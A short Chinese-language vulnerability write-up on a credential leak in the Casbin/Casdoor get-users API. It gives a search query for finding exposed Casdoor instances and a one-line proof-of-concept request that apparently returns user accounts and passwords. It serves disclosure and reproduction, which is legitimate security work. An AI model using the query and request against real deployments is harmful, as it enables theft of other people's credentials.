# Casbin get-users 账号密码泄漏漏洞

## 漏洞描述

Casbin get-users api接口存在账号密码泄漏漏洞，攻击者通过漏洞可以获取用户敏感信息

## 漏洞影响

```
Casbin
```

## 网络测绘

```
title="Casdoor"
```

## 漏洞复现

登录页面

![image-20220524143206718](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326113912173.png)

验证POC

```
/api/get-users?p=123&pageSize=123
```

![image-20220524143215583](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326113912174.png)